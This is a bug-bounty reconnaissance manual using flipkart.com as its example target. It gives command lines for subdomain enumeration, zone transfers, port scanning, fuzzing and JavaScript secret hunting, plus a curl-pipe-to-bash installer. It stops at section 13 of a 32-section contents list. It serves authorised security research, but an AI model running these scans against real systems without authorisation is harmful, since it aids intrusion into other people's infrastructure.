# 🔍 RECONNAISSANCE MASTER GUIDE
### Bug Bounty Edition — Complete Field Manual
**Target Example: flipkart.com | Author: Bug Bounty Hunter's Bible**

---

> **SCOPE DISCLAIMER**: Only perform reconnaissance on targets explicitly listed in a bug bounty program's scope. Never test out-of-scope assets. This guide is for authorized security research only.

---

## TABLE OF CONTENTS

1. [Recon Philosophy & Mindset](#1-recon-philosophy--mindset)
2. [Toolset Installation & Setup](#2-toolset-installation--setup)
3. [Phase 1 — Passive Reconnaissance](#3-phase-1--passive-reconnaissance)
4. [Phase 2 — Subdomain Enumeration](#4-phase-2--subdomain-enumeration)
5. [Phase 3 — DNS Deep Dive](#5-phase-3--dns-deep-dive)
6. [Phase 4 — IP & ASN Mapping](#6-phase-4--ip--asn-mapping)
7. [Phase 5 — Port & Service Scanning](#7-phase-5--port--service-scanning)
8. [Phase 6 — HTTP Probing & Live Host Detection](#8-phase-6--http-probing--live-host-detection)
9. [Phase 7 — Web Crawling & Spidering](#9-phase-7--web-crawling--spidering)
10. [Phase 8 — Directory & File Bruteforcing](#10-phase-8--directory--file-bruteforcing)
11. [Phase 9 — JavaScript Analysis](#11-phase-9--javascript-analysis)
12. [Phase 10 — Parameters & Hidden Inputs](#12-phase-10--parameters--hidden-inputs)
13. [Phase 11 — Technology Fingerprinting](#13-phase-11--technology-fingerprinting)
14. [Phase 12 — CMS Detection (WordPress, Drupal, Joomla)](#14-phase-12--cms-detection)
15. [Phase 13 — Google Dorks & OSINT](#15-phase-13--google-dorks--osint)
16. [Phase 14 — Certificate Transparency Logs](#16-phase-14--certificate-transparency-logs)
17. [Phase 15 — Wayback Machine & Historical Data](#17-phase-15--wayback-machine--historical-data)
18. [Phase 16 — GitHub & Code Leaks](#18-phase-16--github--code-leaks)
19. [Phase 17 — Cloud & S3 Bucket Recon](#19-phase-17--cloud--s3-bucket-recon)
20. [Phase 18 — Email & OSINT](#20-phase-18--email--osint)
21. [Phase 19 — WAF & CDN Fingerprinting](#21-phase-19--waf--cdn-fingerprinting)
22. [Phase 20 — API Discovery](#22-phase-20--api-discovery)
23. [Phase 21 — Mobile App Recon (Android/iOS)](#23-phase-21--mobile-app-recon)
24. [Phase 22 — Shodan, Censys & FOFA](#24-phase-22--shodan-censys--fofa)
25. [Phase 23 — Nuclei — Automated Vuln Scanning](#25-phase-23--nuclei--automated-vuln-scanning)
26. [Phase 24 — Robots.txt, sitemap.xml & Security.txt](#26-phase-24--robotstxt-sitemapxml--securitytxt)
27. [Phase 25 — Virtual Host (VHost) Discovery](#27-phase-25--virtual-host-vhost-discovery)
28. [Phase 26 — Source Code Review Signals](#28-phase-26--source-code-review-signals)
29. [Master Sorting & Organization System](#29-master-sorting--organization-system)
30. [How Top Hunters Use Recon Data](#30-how-top-hunters-use-recon-data)
31. [Full Automation Pipeline](#31-full-automation-pipeline)
32. [Cheat Sheet — All Commands](#32-cheat-sheet--all-commands)

---

## 1. Recon Philosophy & Mindset

### What Separates P1 Hunters from Everyone Else

Elite bug bounty hunters treat reconnaissance as 70% of the job. They don't rush to scan — they **build a map so complete that vulnerabilities become obvious**.

**The Recon Pyramid:**
```
                    [EXPLOITATION]
                  [Vulnerability ID]
              [Pattern Recognition / Analysis]
          [Data Organization & Correlation]
      [Active Recon — Probing, Crawling, Fuzzing]
  [Passive Recon — OSINT, CT Logs, Dorking, Archives]
[Scope Understanding — What's in, what's out, what's juicy]
```

**Core Principles:**
- **Wide before deep** — enumerate everything before going deep on anything
- **Correlate data** — a subdomain from CT logs + S3 bucket from GitHub + old endpoint from Wayback = attack surface gold
- **Think like a developer** — what staging environments did they forget? What APIs did they expose?
- **Automate the boring, manual the interesting** — automate broad sweeps; manually investigate anomalies
- **Document everything** — you'll find the same endpoint twice and waste 3 hours without notes

---

## 2. Toolset Installation & Setup

### One-Time Setup Script

```bash
# =====================================================
# RECON TOOLKIT INSTALLER
# =====================================================

# Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/naabu/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/alterx/cmd/alterx@latest
go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/unfurl@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/httprobe@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/hakluke/haktrails@latest
go install github.com/hakluke/hakrevdns@latest
go install github.com/d3mondev/puredns/v2@latest
go install github.com/ameenmaali/wordlistgen@latest
go install github.com/GerbenJavado/LinkFinder@latest  # (Python, use pip)
go install github.com/s0md3v/uro@latest

# Python tools
pip3 install trufflehog
pip3 install dnsgen
pip3 install arjun
pip3 install linkfinder
pip3 install wafw00f
pip3 install shodan
pip3 install censys
pip3 install ghauri

# Package manager tools
sudo apt install -y amass masscan nmap nikto whatweb dirb gobuster wfuzz ffuf
sudo apt install -y whois dnsutils curl jq git python3 python3-pip

# Special installs
# SecretFinder
git clone https://github.com/m4ll0k/SecretFinder.git ~/tools/SecretFinder
pip3 install -r ~/tools/SecretFinder/requirements.txt

# Subjack
go install github.com/haccer/subjack@latest

# Webanalyze (Wappalyzer CLI)
go install github.com/rverton/webanalyze/cmd/webanalyze@latest

# CMSeeK
git clone https://github.com/Tuhinshubhra/CMSeeK.git ~/tools/CMSeeK
pip3 install -r ~/tools/CMSeeK/requirements.txt

# WPScan
sudo gem install wpscan

# Feroxbuster
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash

# Dalfox
go install github.com/hahwul/dalfox/v2@latest

# cloud_enum
git clone https://github.com/initstring/cloud_enum.git ~/tools/cloud_enum

# S3Scanner
pip3 install s3scanner

# GitDorker / GitHub Recon
git clone https://github.com/obheda12/GitDorker.git ~/tools/GitDorker

# Update nuclei templates
nuclei -update-templates
```

### Directory Structure Setup

```bash
mkdir -p ~/recon/{targets,wordlists,tools,reports}
mkdir -p ~/recon/targets/flipkart.com/{subdomains,dns,ports,urls,js,params,screenshots,nuclei,cloud}

# Essential wordlists
cd ~/recon/wordlists
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/dns-Jhaddix.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt
wget https://raw.githubusercontent.com/assetnote/wordlists/main/data/httparchive_directories_1m_2021_04_28.txt
```

---

## 3. Phase 1 — Passive Reconnaissance

### 3.1 WHOIS Lookup

```bash
TARGET="flipkart.com"

# Basic WHOIS
whois $TARGET | tee ~/recon/targets/$TARGET/dns/whois.txt

# What to look for:
# - Registrant Organization (who owns it, corporate group)
# - Registrant Email (pivot to find other domains they own)
# - Name Servers (identifies CDN, hosting, infrastructure)
# - Creation date (older = more forgotten subdomains)
# - Expiry date (sometimes reveals if they're migrating)

# Find OTHER domains registered with the same email
# Use viewdns.info/reversewhois or domaintools.com
```

**Analysis:** If WHOIS shows `registrant: Flipkart Internet Private Limited`, search that exact string in certificate transparency logs — you'll find ALL their other domains.

### 3.2 Reverse WHOIS

```bash
# Online approach (paste into browser or use API)
# https://www.whoxy.com/reverse-whois/?company=Flipkart+Internet+Private+Limited
# https://viewdns.info/reversewhois/?q=flipkart.com

# CLI with haktrails
echo "flipkart.com" | haktrails reversewhois
```

---

## 4. Phase 2 — Subdomain Enumeration

### 4.1 Subfinder (Passive — Most Sources)

```bash
TARGET="flipkart.com"
OUTDIR=~/recon/targets/$TARGET/subdomains

# Basic run
subfinder -d $TARGET -o $OUTDIR/subfinder.txt

# With all sources (needs API keys in ~/.config/subfinder/provider-config.yaml)
subfinder -d $TARGET -all -o $OUTDIR/subfinder_all.txt -v

# Silent mode for piping
subfinder -d $TARGET -silent | tee $OUTDIR/subfinder_silent.txt

# Multiple domains at once
subfinder -dL domains.txt -o $OUTDIR/subfinder_bulk.txt

# provider-config.yaml (put your API keys here)
# ~/.config/subfinder/provider-config.yaml
# binaryedge:
#   - YOUR_API_KEY
# censys:
#   - YOUR_API_ID
#   - YOUR_API_SECRET
# securitytrails:
#   - YOUR_API_KEY
# shodan:
#   - YOUR_API_KEY
# virustotal:
#   - YOUR_API_KEY
```

### 4.2 Amass (Most Thorough Passive)

```bash
# Passive enumeration
amass enum -passive -d $TARGET -o $OUTDIR/amass_passive.txt

# Active + passive (more results, takes longer)
amass enum -d $TARGET -o $OUTDIR/amass_full.txt -config ~/.config/amass/config.ini

# Just enumerate with brute force
amass enum -brute -d $TARGET -w ~/recon/wordlists/dns-Jhaddix.txt -o $OUTDIR/amass_brute.txt

# Show the network graph / ASN relationships
amass viz -d3 -d $TARGET -o amass_graph.html

# amass config file with API keys (~/.config/amass/config.ini)
# [data_sources.Shodan]
# [credentials]
# apikey = YOUR_KEY
```

### 4.3 Assetfinder

```bash
go install github.com/tomnomnom/assetfinder@latest

assetfinder --subs-only $TARGET | tee $OUTDIR/assetfinder.txt

# Assetfinder uses: crt.sh, HackerTarget, ThreatCrowd, WayBack, VirusTotal, certspotter
```

### 4.4 crt.sh (Certificate Transparency)

```bash
# Query crt.sh directly via curl
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee $OUTDIR/crtsh.txt

# Alternative direct query
curl -s "https://crt.sh/?q=%.flipkart.com&output=json" | jq -r '.[].name_value' | tr ',' '\n' | sort -u > $OUTDIR/crtsh_clean.txt

# Grep for wildcards and interesting patterns
cat $OUTDIR/crtsh.txt | grep -v "^\*" | sort -u
```

### 4.5 DNSdumpster

```bash
# Web: https://dnsdumpster.com (manual, shows map)
# API alternative:
curl -s "https://api.hackertarget.com/hostsearch/?q=$TARGET" | tee $OUTDIR/dnsdumpster.txt
```

### 4.6 GitHub Subdomains

```bash
# Search GitHub for target domain (reveals staging/dev subdomains in code)
# Search: "flipkart.com" site:github.com

# Also search:
# "staging.flipkart.com"
# "dev.flipkart.com"
# "internal.flipkart.com"
# "api.flipkart.com"
```

### 4.7 Merging and Deduplicating All Subdomains

```bash
# Combine ALL subdomain sources
cat $OUTDIR/*.txt | sort -u | tee $OUTDIR/all_subdomains_raw.txt

echo "[*] Total unique subdomains: $(wc -l < $OUTDIR/all_subdomains_raw.txt)"

# Remove wildcards, clean up
cat $OUTDIR/all_subdomains_raw.txt | grep -v "^\*" | grep "\.$TARGET$" | sort -u > $OUTDIR/all_subdomains_clean.txt

# Use anew to only add new entries (great for continuous recon)
subfinder -d $TARGET -silent | anew $OUTDIR/all_subdomains_clean.txt
```

### 4.8 DNS Bruteforce with PureDNS

```bash
# PureDNS — resolves and bruteforces at the same time, uses resolver lists
puredns bruteforce ~/recon/wordlists/dns-Jhaddix.txt $TARGET \
  --resolvers ~/recon/wordlists/resolvers.txt \
  -o $OUTDIR/puredns_brute.txt

# Get a fresh resolver list
wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/recon/wordlists/resolvers.txt

# After brute: add results to master list
cat $OUTDIR/puredns_brute.txt | anew $OUTDIR/all_subdomains_clean.txt
```

### 4.9 Permutation-Based Subdomain Discovery (AlterX)

```bash
# AlterX generates smart permutations based on existing subdomains
cat $OUTDIR/all_subdomains_clean.txt | alterx | dnsx -silent | tee $OUTDIR/alterx_results.txt

# Custom permutation patterns
cat $OUTDIR/all_subdomains_clean.txt | alterx -enrich -p "{{word}}-{{suffix}}" | tee $OUTDIR/alterx_patterns.txt

# dnsgen approach
cat $OUTDIR/all_subdomains_clean.txt | dnsgen - | puredns resolve --resolvers ~/recon/wordlists/resolvers.txt | tee $OUTDIR/dnsgen_results.txt
```

---

## 5. Phase 3 — DNS Deep Dive

### 5.1 Mass DNS Resolution with DNSX

```bash
# Resolve all subdomains — find which ones are actually alive
dnsx -l $OUTDIR/all_subdomains_clean.txt -silent -o $OUTDIR/resolved_subdomains.txt

# Get full DNS record details
dnsx -l $OUTDIR/all_subdomains_clean.txt \
  -a -aaaa -cname -mx -ns -txt -ptr \
  -json -o $OUTDIR/dns_full.json

# Extract just A records (IPs) — crucial for IP mapping
dnsx -l $OUTDIR/all_subdomains_clean.txt -a -resp-only -silent | sort -u | tee $OUTDIR/ips_from_dns.txt

# Find CNAMEs — potential subdomain takeovers
dnsx -l $OUTDIR/all_subdomains_clean.txt -cname -resp -silent | tee $OUTDIR/cnames.txt
```

### 5.2 Finding Subdomain Takeover with Subjack

```bash
# Check for takeover opportunities in CNAMEs
subjack -w $OUTDIR/all_subdomains_clean.txt -t 100 -timeout 30 -ssl -o $OUTDIR/subjack_results.txt -v

# What to look for:
# - CNAMEs pointing to GitHub Pages, Heroku, AWS, Azure, Shopify etc. that aren't configured
# - "NoSuchBucket" → S3 takeover possible
# - "There isn't a GitHub Pages site here" → GitHub Pages takeover
# - "No such app" → Heroku takeover
```

### 5.3 DNS Zone Transfer Attempt

```bash
# Get nameservers first
dig NS $TARGET +short

# Attempt zone transfer (mostly fails but worth trying)
dig AXFR $TARGET @ns1.flipkart.com
dig AXFR $TARGET @ns2.flipkart.com

# If zone transfer works → you get EVERY DNS record = jackpot
```

### 5.4 DNS Record Enumeration

```bash
# All record types
for type in A AAAA MX NS TXT SOA CNAME PTR SRV CAA; do
  echo "=== $type records ==="
  dig $type $TARGET +short
done

# Interesting TXT records to look for:
# - SPF records → reveal mail infrastructure
# - DMARC records → "v=DMARC1" → email security posture
# - Google verification → "_google-site-verification" → linked Google account
# - Amazon SES verification
# - Stripe, Sendgrid verification → reveals vendors they use
```

---

## 6. Phase 4 — IP & ASN Mapping

### 6.1 Find All ASNs Owned by Target

```bash
# Find ASN from domain
curl -s "https://api.bgpview.io/search?query_term=flipkart" | jq '.data.asns[] | .asn, .name, .description'

# Find IP ranges for an ASN
curl -s "https://api.bgpview.io/asn/AS45528/prefixes" | jq '.data.ipv4_prefixes[].prefix'

# Alternative
whois -h whois.radb.net -- '-i origin AS45528' | grep -Eo "([0-9.]+){4}/[0-9]+"

# Amass intel for ASN discovery
amass intel -asn 45528 -o $OUTDIR/asn_ips.txt
```

### 6.2 Reverse IP Lookup

```bash
# Find all domains on the same IP (shared hosting = pivot point)
curl -s "https://api.hackertarget.com/reverseiplookup/?q=52.66.91.6"

# Or
hakrevdns -d 52.66.91.6 | tee $OUTDIR/reverse_ip.txt
```

---

## 7. Phase 5 — Port & Service Scanning

### 7.1 Fast Port Scan with Naabu

```bash
# Scan all resolved IPs for open ports
cat $OUTDIR/ips_from_dns.txt | naabu -p - -silent -o $OUTDIR/open_ports.txt

# Only common ports (faster)
naabu -l $OUTDIR/ips_from_dns.txt -top-ports 1000 -silent -o $OUTDIR/ports_top1000.txt

# With service detection pipe to httpx
naabu -l $OUTDIR/ips_from_dns.txt -p 80,443,8080,8443,8888,3000,5000,9000 -silent | httpx -silent | tee $OUTDIR/web_services.txt
```

### 7.2 Nmap (Detailed Service Version Detection)

```bash
# Service version detection on interesting ports
nmap -sV -sC -T4 -p 80,443,8080,8443,22,21,25,3306,6379,27017,9200,5432 \
  -iL $OUTDIR/ips_from_dns.txt \
  -oA $OUTDIR/nmap_services

# Full aggressive scan on a specific interesting IP
nmap -A -T4 -p- 13.127.98.74 -oN $OUTDIR/nmap_full.txt

# Common exposed ports that indicate vulns:
# 6379 → Redis (often unauthenticated)
# 27017 → MongoDB (often unauthenticated)
# 9200 → Elasticsearch (often unauthenticated)
# 5432 → PostgreSQL
# 3306 → MySQL
# 2375 → Docker daemon API (RCE)
# 22 → SSH (brute forceable)
# 11211 → Memcached (amplification/data leak)
```

---

## 8. Phase 6 — HTTP Probing & Live Host Detection

### 8.1 HTTPX — The Gold Standard

```bash
# Basic live host detection
cat $OUTDIR/all_subdomains_clean.txt | httpx -silent -o $OUTDIR/live_hosts.txt

# Full detailed probe — status code, title, tech, server
cat $OUTDIR/all_subdomains_clean.txt | httpx \
  -status-code \
  -title \
  -tech-detect \
  -server \
  -content-length \
  -follow-redirects \
  -threads 50 \
  -timeout 10 \
  -o $OUTDIR/httpx_full.txt \
  -json -o $OUTDIR/httpx_full.json

# Probe specific ports too
cat $OUTDIR/all_subdomains_clean.txt | httpx -ports 80,443,8080,8443,3000,8888,5000 -silent | tee $OUTDIR/live_all_ports.txt

# Extract just URLs for further processing
cat $OUTDIR/httpx_full.txt | grep -oP "https?://[^\s]+" | sort -u | tee $OUTDIR/live_urls.txt
```

### 8.2 Filtering by Status Codes

```bash
# Find all redirects (301/302) — often reveals internal structure
cat $OUTDIR/httpx_full.json | jq -r 'select(.status_code == 301 or .status_code == 302) | .url' | tee $OUTDIR/redirects.txt

# Find 403 Forbidden — sometimes bypassable
cat $OUTDIR/httpx_full.json | jq -r 'select(.status_code == 403) | .url' | tee $OUTDIR/forbidden_403.txt

# Find interesting non-200 that aren't 404
cat $OUTDIR/httpx_full.json | jq -r 'select(.status_code != 404 and .status_code != 200) | "\(.status_code) \(.url)"' | sort | tee $OUTDIR/interesting_codes.txt

# Find development/staging instances by title
cat $OUTDIR/httpx_full.json | jq -r 'select(.title | test("dev|staging|test|admin|internal|beta"; "i")) | .url' | tee $OUTDIR/staging_hosts.txt
```

### 8.3 Screenshots with GoWitness / Eyewitness

```bash
# Install gowitness
go install github.com/sensepost/gowitness@latest

# Screenshot all live hosts
gowitness scan file -f $OUTDIR/live_urls.txt --screenshot-path $OUTDIR/screenshots/ --write-db

# Generate HTML report
gowitness report generate --db-file gowitness.sqlite3 --open

# Why screenshots matter:
# - Quickly identify login panels, admin interfaces, default pages
# - Spot outdated software (Jenkins version in title, old Tomcat page, etc.)
# - Find forgotten applications that don't appear in scope overview
```

---

## 9. Phase 7 — Web Crawling & Spidering

### 9.1 Katana — Modern Crawler

```bash
# Standard crawl
katana -u https://www.flipkart.com -o $OUTDIR/urls/katana.txt

# Deep crawl with JavaScript rendering
katana -u https://www.flipkart.com \
  -jc \
  -d 5 \
  -c 50 \
  -timeout 10 \
  -crawl-scope ".*flipkart\.com.*" \
  -o $OUTDIR/urls/katana_deep.txt

# Crawl multiple targets
katana -list $OUTDIR/live_urls.txt -silent -d 3 -jc | tee $OUTDIR/urls/katana_all.txt

# Extract forms (important for injection points)
katana -u https://www.flipkart.com -form-extraction -o $OUTDIR/urls/katana_forms.txt
```

### 9.2 Hakrawler

```bash
# Simple fast crawl
echo "https://www.flipkart.com" | hakrawler | tee $OUTDIR/urls/hakrawler.txt

# Depth 3, include subs
echo "https://www.flipkart.com" | hakrawler -depth 3 -subs -insecure | tee $OUTDIR/urls/hakrawler_deep.txt

# All subdomains
cat $OUTDIR/live_urls.txt | hakrawler -subs | tee $OUTDIR/urls/hakrawler_all.txt
```

### 9.3 GAU — Get All URLs (Wayback + CommonCrawl + OTX + urlscan)

```bash
# Pull all known URLs for target
gau $TARGET | tee $OUTDIR/urls/gau.txt

# With extra sources
gau --providers wayback,commoncrawl,otx,urlscan $TARGET | tee $OUTDIR/urls/gau_all.txt

# Filter by interesting extensions
gau $TARGET | grep -E "\.(php|asp|aspx|cfm|jsp|json|xml|yaml|yml|env|log|bak|old|sql|db)$" | tee $OUTDIR/urls/gau_interesting.txt
```

### 9.4 Waybackurls

```bash
waybackurls $TARGET | tee $OUTDIR/urls/wayback.txt

# Combine and deduplicate all URL sources
cat $OUTDIR/urls/*.txt | sort -u | uro | tee $OUTDIR/urls/all_urls.txt

echo "[*] Total unique URLs: $(wc -l < $OUTDIR/urls/all_urls.txt)"
```

### 9.5 URL Classification with URO

```bash
# uro removes duplicate patterns (like /product/1, /product/2 → /product/{id})
cat $OUTDIR/urls/all_urls.txt | uro | tee $OUTDIR/urls/urls_deduped.txt
```

---

## 10. Phase 8 — Directory & File Bruteforcing

### 10.1 FFUF — Fastest Fuzzer

```bash
# Basic directory discovery
ffuf -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -u https://www.flipkart.com/FUZZ \
  -mc 200,204,301,302,307,401,403 \
  -t 50 \
  -o $OUTDIR/ffuf_dirs.json \
  -of json

# Filter noise (remove common page sizes)
ffuf -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -u https://www.flipkart.com/FUZZ \
  -mc 200,301,302 \
  -fs 12345 \   # filter by size (replace with actual 404 page size)
  -t 100

# API endpoint discovery
ffuf -w ~/recon/wordlists/api-endpoints.txt \
  -u https://api.flipkart.com/FUZZ \
  -mc 200,201,204 \
  -H "Content-Type: application/json" \
  -t 50

# Fuzz with extensions (find backup files, config files)
ffuf -w ~/recon/wordlists/raft-large-files.txt \
  -u https://www.flipkart.com/FUZZ \
  -e .bak,.old,.zip,.sql,.tar,.gz,.config,.env,.log,.php,.asp \
  -mc 200 \
  -t 50

# Recursive fuzzing
ffuf -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -u https://www.flipkart.com/FUZZ \
  -recursion \
  -recursion-depth 3 \
  -mc 200,301 \
  -t 30

# Fuzz subdomains (VHost discovery)
ffuf -w ~/recon/wordlists/subdomains.txt \
  -u https://flipkart.com \
  -H "Host: FUZZ.flipkart.com" \
  -mc 200 \
  -fs [404_response_size]
```

### 10.2 Feroxbuster — Recursive by Default

```bash
# Recursive scan — great for deep directory trees
feroxbuster -u https://www.flipkart.com \
  -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -x php,html,js,json,xml \
  -t 50 \
  --depth 3 \
  -o $OUTDIR/feroxbuster.txt

# With custom headers
feroxbuster -u https://seller.flipkart.com \
  -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -H "Authorization: Bearer token123" \
  -t 50

# Smart filtering (filter by word count, line count, size)
feroxbuster -u https://www.flipkart.com \
  -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  --filter-status 404 \
  --filter-similar-to https://www.flipkart.com/notfound
```

### 10.3 Gobuster

```bash
# Directory mode
gobuster dir \
  -u https://www.flipkart.com \
  -w ~/recon/wordlists/directory-list-2.3-medium.txt \
  -x php,html,txt,json \
  -t 50 \
  -o $OUTDIR/gobuster_dirs.txt

# DNS mode
gobuster dns \
  -d flipkart.com \
  -w ~/recon/wordlists/dns-Jhaddix.txt \
  -t 50 \
  -o $OUTDIR/gobuster_dns.txt

# VHost mode
gobuster vhost \
  -u https://flipkart.com \
  -w ~/recon/wordlists/subdomains.txt \
  -t 50
```

### 10.4 Sorting FFUF Results

```bash
# Parse ffuf JSON output — get all 200s sorted by length
cat $OUTDIR/ffuf_dirs.json | jq '.results[] | select(.status==200) | {url: .url, length: .length, words: .words}' | jq -s 'sort_by(.length) | reverse'

# Get just URLs of 200 responses
cat $OUTDIR/ffuf_dirs.json | jq -r '.results[] | select(.status==200) | .url' | sort -u | tee $OUTDIR/dirs_200.txt

# Filter out 403s (access denied — good for bypass attempts)
cat $OUTDIR/ffuf_dirs.json | jq -r '.results[] | select(.status==403) | .url' | tee $OUTDIR/dirs_403.txt
```

---

## 11. Phase 9 — JavaScript Analysis

### 11.1 Extract All JS Files

```bash
# From crawled URLs, extract .js files
cat $OUTDIR/urls/all_urls.txt | grep "\.js$" | sort -u | tee $OUTDIR/js/js_files.txt

# Also find inline JS — use katana with JS extraction
katana -u https://www.flipkart.com -jc -ef css,png,jpg,gif,ico | grep "\.js" | tee $OUTDIR/js/js_katana.txt

# Download all JS files for offline analysis
mkdir -p $OUTDIR/js/downloaded
cat $OUTDIR/js/js_files.txt | while read url; do
  filename=$(echo $url | md5sum | cut -d' ' -f1).js
  curl -sk "$url" > $OUTDIR/js/downloaded/$filename
  echo "$url -> $filename" >> $OUTDIR/js/url_map.txt
done
```

### 11.2 LinkFinder — Extract Endpoints from JS

```bash
# Single JS file
python3 ~/tools/LinkFinder/linkfinder.py -i https://www.flipkart.com/static/app.js -o cli

# All downloaded JS files
for jsfile in $OUTDIR/js/downloaded/*.js; do
  python3 ~/tools/LinkFinder/linkfinder.py -i $jsfile -o cli 2>/dev/null
done | sort -u | tee $OUTDIR/js/endpoints_from_js.txt

# Filter interesting endpoints
cat $OUTDIR/js/endpoints_from_js.txt | grep -E "(/api/|/v[0-9]/|/admin|/internal|/debug|/graphql|/upload)" | tee $OUTDIR/js/api_endpoints.txt
```

### 11.3 SecretFinder — Find API Keys, Tokens in JS

```bash
# Scan all downloaded JS files for secrets
for jsfile in $OUTDIR/js/downloaded/*.js; do
  python3 ~/tools/SecretFinder/SecretFinder.py -i $jsfile -o cli 2>/dev/null
done | tee $OUTDIR/js/secrets.txt

# What SecretFinder looks for:
# - Google API keys (AIza...)
# - AWS Access Keys (AKIA...)
# - Stripe keys (sk_live_...)
# - GitHub tokens (ghp_...)
# - JWT tokens
# - Firebase URLs
# - Slack tokens
# - SendGrid API keys
# - Twilio tokens

# Use truffleHog on repos
trufflehog github --org=flipkart-incubator --only-verified
```

### 11.4 Manual JS Analysis Tips

```bash
# Pretty-print minified JS
cat minified.js | npx prettier --parser babel > pretty.js

# Search for interesting strings
grep -iE "(api_key|secret|token|password|auth|bearer|private|config|endpoint|internal|staging|debug)" pretty.js

# Find all fetch/axios/XHR calls
grep -E "(fetch|axios|XMLHttpRequest|$.ajax)\(" pretty.js
```

---

## 12. Phase 10 — Parameters & Hidden Inputs

### 12.1 Arjun — Hidden Parameter Discovery

```bash
# Single endpoint
arjun -u "https://www.flipkart.com/search" -m GET -oT $OUTDIR/params/arjun_search.txt

# Bulk scan (give it all your URLs)
arjun -i $OUTDIR/urls/urls_deduped.txt -oT $OUTDIR/params/arjun_bulk.txt -t 20

# With custom headers
arjun -u "https://api.flipkart.com/products" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -m GET,POST \
  -oT $OUTDIR/params/arjun_api.txt
```

### 12.2 Paramspider — Extract Parameters from Wayback

```bash
go install github.com/devanshbatham/paramspider@latest

paramspider -d $TARGET --output $OUTDIR/params/paramspider.txt

# Filter unique params
cat $OUTDIR/params/paramspider.txt | grep "=" | grep -oP "(?<=[?&])\w+" | sort -u | tee $OUTDIR/params/unique_params.txt
```

### 12.3 GF Patterns — Classify URLs by Vulnerability Type

```bash
# Install gf patterns
mkdir -p ~/.gf
git clone https://github.com/tomnomnom/gf.git
cp -r gf/examples/* ~/.gf/

# Also get more patterns
git clone https://github.com/1ndianl33t/Gf-Patterns.git
cp Gf-Patterns/*.json ~/.gf/

# Use gf to filter interesting URLs
cat $OUTDIR/urls/all_urls.txt | gf xss | tee $OUTDIR/params/xss_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf sqli | tee $OUTDIR/params/sqli_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf ssrf | tee $OUTDIR/params/ssrf_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf lfi | tee $OUTDIR/params/lfi_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf redirect | tee $OUTDIR/params/redirect_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf idor | tee $OUTDIR/params/idor_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf rce | tee $OUTDIR/params/rce_candidates.txt
cat $OUTDIR/urls/all_urls.txt | gf ssti | tee $OUTDIR/params/ssti_candidates.txt

# Available patterns: aws-keys, base64, cors, debug-pages, firebase, fw, 
#                     gcloud, go-functions, idor, img-traversal, interestingparams,
#                     interestingEXT, interestingSubs, json-sec, jsvar, lfi, mg-debug,
#                     php-curl, php-errors, php-serialized, php-sinks, php-sources,
#                     potential, rce, redirect, sqli, ssrf, ssti, takeovers, upload-fields, xss
```

### 12.4 Unfurl — Analyze URL Structure

```bash
# Understand URL parameters
echo "https://www.flipkart.com/search?q=laptop&sid=6bo&p[]=facets.brand%255B%255D%3DLenovo" | unfurl keys
echo "https://www.flipkart.com/search?q=laptop&sid=6bo" | unfurl values
echo "https://www.flipkart.com/search?q=laptop&sid=6bo" | unfurl format '%s://%d%p?%q'
```

---

## 13. Phase 11 — Technology Fingerprinting

### 13.1 Whatweb

```bash
# Single target
whatweb https://www.flipkart.com -v | tee $OUTDIR/tech/whatweb.txt

# Aggressive mode
whatweb https://www.flipkart.com -a 3 -v

# Bulk scan
whatweb -i $OUTDIR/live_urls.txt --log-json=$OUTDIR/tech/whatweb.json
```

### 13.2 Webanalyze (Wappalyzer CLI)

```bash
# Update technologies database
webanalyze -update

# Single scan
webanalyze -host https://www.flipkart.com | tee $OUTDIR/tech/webanalyze.txt

# Bulk
webanalyze -hosts $OUTDIR/live_urls.txt -workers 10 -output json | tee $OUTDIR/tech/webanalyze_bulk.json

# Parse results — find all WordPress sites in target scope
cat $OUTDIR/tech/webanalyze_bulk.json | jq -r 'select(.matches[].app_name == "WordPress") | .host'
```

### 13.3 HTTPX Tech Detection

```bash
# Already included in our httpx full probe, but targeted:
cat $OUTDIR/live_urls.txt | httpx -tech-detect -json | \
  jq -r '. | "\(.url) → \(.tech[]? // "unknown")"' | sort | tee $OUTDIR/tech/httpx_tech.txt

# Group by technology
cat $OUTDIR/tech/httpx_tech.json | jq -r '.tech[]?' | sort | uniq -c | sort -rn
```

**What to do with tech fingerprints:**
- **PHP** → Look for deserialization, file upload, LFI vulns
- **Java/Spring** → SSRF via XXE, Spring4Shell, Actuator endpoints
- **ASP.NET** → ViewState attacks, padding oracle
- **Ruby on Rails** → Mass assignment, IDOR
- **Node.js** → Prototype pollution, RCE in deserialization
